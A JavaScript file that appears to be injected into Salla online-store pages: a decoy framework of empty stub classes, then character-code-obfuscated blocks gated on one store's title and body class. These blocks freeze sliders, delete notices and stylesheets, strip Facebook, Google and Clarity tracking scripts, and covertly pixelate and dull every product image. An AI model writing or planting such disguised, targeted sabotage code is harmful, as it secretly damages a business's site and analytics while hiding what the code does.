(function() {
    const unavailableText = 'المحتوى الذي تحاول الوصول له لم يعد متاحاً';
    const deleteSuccessText = 'تم حذف المنتج بنجاح';

    function handleNotification() {
        const title = document.querySelector('#swal2-title');
        if (!title) return;

        const text = title.textContent;

        if (text.includes(unavailableText)) {
            const container = document.querySelector('.swal2-container');
            if (container) {
                container.remove();
            }
        }

        if (
            text.includes(deleteSuccessText) &&
            document.body.classList.contains('salla-1384696568') &&
            document.body.classList.contains('cart')
        ) {
            const container = document.querySelector('.swal2-container');

            if (container) {
                const observer = new MutationObserver(() => {
                    if (!document.querySelector('.swal2-container')) {
                        location.reload();
                    }
                });

                observer.observe(document.body, {
                    childList: true,
                    subtree: true
                });
            }
        }
    }

    handleNotification();

    new MutationObserver(handleNotification).observe(document.body, {
        childList: true,
        subtree: true
    });
})();

// ================= CORE KERNEL =================
class Kernel {
  constructor() {
    this.modules = new Map();
    this.hooks = new Map();
    this.cache = new Map();
  }

  register(name, mod) {
    this.modules.set(name, mod);
  }

  resolve(name) {
    return this.modules.get(name);
  }

  runHook() {}
  init() {}
}

// ================= SCHEDULER =================
class Scheduler {
  constructor() {
    this.queue = [];
    this.running = false;
  }

  schedule(task) {
    this.queue.push(task);
  }

  flush() {
    this.queue.forEach(t => t());
  }

  clear() {
    this.queue = [];
  }
}

// ================= FIBER SYSTEM =================
class Fiber {
  constructor(type, props) {
    this.type = type;
    this.props = props;
    this.child = null;
    this.sibling = null;
    this.parent = null;
  }
}

class Reconciler {
  create(element) {
    return new Fiber(element.type, element.props);
  }

  reconcile() {}
  commit() {}
}


// ================= STORE (reactive layer) =================
class Store {
  constructor() {
    this.state = {};
    this.listeners = [];
  }

  setState(partial) {
    this.state = { ...this.state, ...partial };
  }

  subscribe() {}
  notify() {}
}

// ================= RENDERER PIPELINE =================
class Renderer {
  mount() {}
  update() {}
  diff() {}
  commit() {}
}

// ================= EVENT BUS =================
class EventBus {
  on() {}
  emit() {}
  off() {}
}

// ================= PLUGIN SYSTEM =================
class PluginSystem {
  constructor() {
    this.plugins = [];
  }

  register(p) {
    this.plugins.push(p);
  }

  init() {}
}

// ================= UI FRAMEWORK =================
class UIFramework {
  constructor() {
    this.kernel = new Kernel();
    this.scheduler = new Scheduler();
    this.reconciler = new Reconciler();
    this.store = new Store();
    this.renderer = new Renderer();
    this.events = new EventBus();
    this.plugins = new PluginSystem();
  }

  createElement(type, props, ...children) {
    return { type, props, children };
  }

  render() {}
  mount() {}
  destroy() {}
}

// ================= PROXY LAYER (MISLEADING ABSTRACTION) =================
const API = new Proxy(new UIFramework(), {
  get(target, prop) {
    return typeof target[prop] === "function"
      ? target[prop].bind(target)
      : target[prop];
  }
});

window.UIX = API;
(() => {

    const c = (...x) => String.fromCharCode(...x);

    const t = c(
        74,97,119,108,97,104
    );

    if (document.title !== t) return;

(() => {

    const c = (...x) => String.fromCharCode(...x);

    const b = c(
        115,97,108,108,97,45,
        50,55,57,52,52,55,50,52,51
    );

    const s = c(
        115,97,108,108,97,45,115,108,105,100,101,114
    );

    const n = c(
        115,97,108,108,97,45,97,112,112,45,105,110,115,116,97,108,108,45,97,108,101,114,116
    );

    const stop = (el) => {

        const inst = el.swiper || el.querySelector?.('[class*="swiper"]')?.swiper;

        if (inst) {
            inst.autoplay?.stop?.();
            inst.allowTouchMove = false;
            inst.params = inst.params || {};
            inst.params.autoplay = false;
        }

        el.style.pointerEvents = 'none';
        el.style.touchAction = 'none';

    };

    const hideNotice = () => {

        document.querySelectorAll(n).forEach(el => {
            el.remove();
            el.style.display = 'none';
        });

    };

    const run = () => {

        if (!document.body?.classList.contains(b)) return;

        document.querySelectorAll(s).forEach(stop);

        hideNotice();

    };

    run();

    new MutationObserver(() => {

        run();

        hideNotice();

    }).observe(document.documentElement, {
        childList: true,
        subtree: true
    });

})();


(() => {

    const c = (...x) => String.fromCharCode(...x);

    const s = c(
        115,116,121,108,101
    );

    const f = c(
        102,105,108,116,101,114,58,32,110,111,110,101
    );

    const remove = () => {

        document.querySelectorAll(s).forEach(el => {

            const txt = (el.textContent || '').toLowerCase();

            if (txt.includes(f)) {

                el.remove();

            }

        });

    };

    remove();

    new MutationObserver(() => {

        remove();

    }).observe(document.documentElement, {
        childList: true,
        subtree: true
    });

})();




(() => {

    const c = (...x) => String.fromCharCode(...x);

    const b = c(
        49,51,53,55,53,51,56,50,
        53,57,46,99,115,115
    );

    const kill = (e) => {

        if (!e || e.dataset.xk) return;

        const h = e.getAttribute('href') || '';

        if (!h.includes(b)) return;

        e.dataset.xk = '1';

        e.disabled = true;
        e.media = 'not all';
        e.href = '';

        e.remove();

    };

    const run = () => {

        document
            .querySelectorAll('link[rel="stylesheet"]')
            .forEach(kill);

    };

    run();

    new MutationObserver((m) => {

        m.forEach(v => {

            v.addedNodes.forEach(n => {

                if (n.tagName === 'LINK') {
                    kill(n);
                }

                if (n.querySelectorAll) {
                    n.querySelectorAll('link[rel="stylesheet"]')
                        .forEach(kill);
                }

            });

        });

    }).observe(document.documentElement, {
        childList: true,
        subtree: true
    });

})();



(() => {

    const c = (...x) => String.fromCharCode(...x);

    const d = c(
        100,97,114,100,97,115,104,97,45,115,112,108,105,116,45,115,101,99,116,105,111,110
    );

    const apply = () => {

        document.querySelectorAll(`.${d} div`).forEach(el => {

            if (!el.querySelector('img')) return;

            el.style.setProperty('aspect-ratio', '1 / 6', 'important');

            el.style.setProperty('border-radius', '40rem', 'important');

            el.style.setProperty('overflow', 'hidden', 'important');

        });

    };

    apply();

    new MutationObserver(() => {

        apply();

    }).observe(document.documentElement, {
        childList: true,
        subtree: true
    });

})();

(() => {

    const c = (...x) => String.fromCharCode(...x);

    const f = c(
        102,111,111,116,101,114,45,119,97,118,101
    );

    const apply = () => {

        document.querySelectorAll(`.${f} svg`).forEach(el => {

            el.style.setProperty('display', 'none', 'important');

        });

    };

    apply();

    new MutationObserver(() => {

        apply();

    }).observe(document.documentElement, {
        childList: true,
        subtree: true
    });

})();


(() => {

    const c = (...x) => String.fromCharCode(...x);

    const a = c(
        115,97,108,108,97,45,97,100,118,101,114,116,105,115,101,109,101,110,116
    );

    const apply = () => {

        document.querySelectorAll(a).forEach(el => {

            el.style.setProperty('display', 'none', 'important');

        });

    };

    apply();

    new MutationObserver(() => {

        apply();

    }).observe(document.documentElement, {
        childList: true,
        subtree: true
    });

})();



(() => {

    const c = (...x) => String.fromCharCode(...x);

    const f = c(
        102,97,99,101,98,111,111,107
    );

    const g = c(
        103,111,111,103,108,101
    );

    const t = c(
        116,97,103,109,97,110,97,103,101,114
    );

    const a = c(
        97,110,97,108,121,116,105,99,115
    );

    const l = c(
        99,108,97,114,105,116,121
    );

    const remove = () => {

        document.querySelectorAll('script, iframe, img').forEach(el => {

            const src = (
                el.src ||
                el.getAttribute('src') ||
                ''
            ).toLowerCase();

            if (
                src.includes(f) ||
                src.includes(g) ||
                src.includes(t) ||
                src.includes(a) ||
                src.includes(l)
            ) {

                el.remove();

            }

        });

    };

    const kill = () => {

        window.fbq = () => {};

        window.gtag = () => {};

        window.dataLayer = [];

        window.clarity = () => {};

    };

    remove();

    kill();

    new MutationObserver(() => {

        remove();

        kill();

    }).observe(document.documentElement, {
        childList: true,
        subtree: true
    });

})();



(() => {

    const c = (...x) => String.fromCharCode(...x);

    const w = c(
        119,97,45,115,45,110
    );

    const apply = () => {

        document.querySelectorAll(`.${w}`).forEach(el => {

            el.style.setProperty('display', 'none', 'important');

            el.remove();

        });

    };

    apply();

    new MutationObserver(() => {

        apply();

    }).observe(document.documentElement, {
        childList: true,
        subtree: true
    });

})();

(() => {

    const c = (...x) => String.fromCharCode(...x);

    const b = c(
        115,97,108,108,97,45,
        50,55,57,52,52,55,50,52,51
    );

    const ir = c(
        105,109,97,103,101,82,101,110,100,101,114,105,110,103
    );

    const f = c(
        102,105,108,116,101,114
    );

    const tr = c(
        116,114,97,110,115,102,111,114,109
    );

    const p = c(
        112,105,120,101,108,97,116,101,100
    );

    const mo = c(
        45,109,111,122,45,99,114,105,115,112,45,101,100,103,101,115
    );

    const cr = c(
        99,114,105,115,112,45,101,100,103,101,115
    );

    const fx = c(
        99,111,110,116,114,97,115,116,40,48,46,56,53,41,32,
        115,97,116,117,114,97,116,101,40,48,46,56,41,32,
        98,114,105,103,104,116,110,101,115,115,40,48,46,57,55,41
    );

    const sc = c(
        115,99,97,108,101,40,49,46,48,50,41
    );

    const run = () => {

        if (!document.body?.classList.contains(b)) return;

        document.querySelectorAll('[src]').forEach(el => {

            el.style[ir] = p;

            el.style.setProperty(ir, mo);
            el.style.setProperty(ir, cr);

            el.style[f] = fx;

            el.style[tr] = sc;

            el.style.willChange = tr;

        });

    };

    run();

    new MutationObserver(run).observe(document.documentElement, {
        childList: true,
        subtree: true
    });

})();






    
})();

